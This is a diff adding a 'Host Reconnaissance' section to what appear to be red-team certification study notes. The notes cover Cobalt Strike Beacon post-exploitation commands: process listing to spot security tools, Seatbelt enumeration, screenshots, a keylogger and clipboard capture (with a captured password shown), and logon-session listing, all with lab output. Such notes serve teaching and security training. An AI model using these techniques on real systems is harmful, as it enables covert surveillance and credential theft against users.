@@ -400,3 +400,76 @@ The Python HTTP server is a nice quick way to spin up a web server for testing.
 python3 -m http.server 8080
 ```
 
+# Host Reconnaissance
+### Processes
+- List running processes on a system using the `ps` command.  Can provide clues as to any custom applications and AV solutions that may be running.
+
+![image](https://github.com/AbdullahZuhair21/CRTO/assets/154827329/09199bf7-06cc-4867-b373-fe552835cc5d)
+
+- There are several interesting processes here including `Sysmon64`, `MsMpEng`, `elastic-endpoint`, and `elastic-agent`.  When running in medium integrity (i.e. a standard user), you will not be able to see arch, session and user information for processes that your current user does not own.
+
+### Seatbelt
+- [Seatbelt](https://github.com/GhostPack/Seatbelt) is a C# tool which automatically collects enumeration data for a host.  It can check for security configurations such as OS info, AV, AppLocker, LAPS, PowerShell logging, audit policies, .NET versions, firewall rules, and more.
+```
+beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe -group=system
+```
+![image](https://github.com/AbdullahZuhair21/CRTO/assets/154827329/67576b83-a2bd-4657-aecb-3fc748806d78)
+
+### Screenshots
+- Taking screenshots of the user’s desktop can be useful just to see what they are doing.  It can show what systems or applications they're using, what shortcuts they have, what documents they’re working on and so on.
+
+- Beacon has multiple commands for taking screenshots which work in slightly different ways.
+```
+printscreen               Take a single screenshot via PrintScr method
+screenshot                Take a single screenshot
+screenwatch               Take periodic screenshots of desktop
+```
+```
+beacon> screenshot
+[*] received screenshot of Sticky Notes from bfarmer (46kb)
+```
+To see all the screenshots that have been taken, go to `View` > `Screenshots`
+
+![image](https://github.com/AbdullahZuhair21/CRTO/assets/154827329/9c2d137d-7450-4dfd-a21a-931fdf033c6c)
+
+### Keylogger
+- A keylogger can capture the keystrokes of a user, which is especially useful for capturing usernames, passwords and other sensitive information.
+```
+beacon> keylogger
+[+] received keystrokes from *Untitled - Notepad by bfarmer
+```
+- All keystrokes can be seen at View > Keystrokes.
+![image](https://github.com/AbdullahZuhair21/CRTO/assets/154827329/46ad05a5-83c1-4919-a5a2-cba656cac309)
+
+- The keylogger runs as a job that can be stopped with the `jobkill` command.
+```
+beacon> jobs
+[*] Jobs
+
+ JID  PID   Description
+ ---  ---   -----------
+ 6    0     keystroke logger
+
+beacon> jobkill 6
+```
+
+### Clipboard
+- The clipboard command will capture any text from the user's clipboard (it does not capture images or any other types of data).  This can be handy for capturing credentials that are being copy/pasted, which can be especially prevalent when password managers are in use.
+```
+beacon> clipboard
+[*] Tasked beacon to get clipboard contents
+
+Clipboard Data (8 bytes):
+Sup3rman
+```
+### User Sessions
+- The `net logons` command will list the logon sessions on this machine.
+```
+beacon> net logons
+
+Logged on users at \\localhost:
+
+DEV\bfarmer
+DEV\jking
+DEV\WKSTN-2$
+```
